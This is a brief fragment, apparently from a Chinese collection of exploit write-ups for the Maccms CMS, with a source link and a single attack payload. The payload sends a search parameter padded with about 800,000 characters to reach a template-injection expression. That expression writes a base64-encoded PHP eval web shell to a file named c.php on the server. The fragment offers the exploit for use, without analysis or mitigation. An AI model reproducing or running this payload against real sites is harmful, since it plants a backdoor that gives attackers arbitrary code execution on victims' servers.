...
> 原文：[http://book.iwonder.run/0day/Maccms/4.html](http://book.iwonder.run/0day/Maccms/4.html)
...
wd=uniona(这里 a 为 80w 个，可用 Burp 直接生成){if-A:print(fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29)}{endif-A} 
```
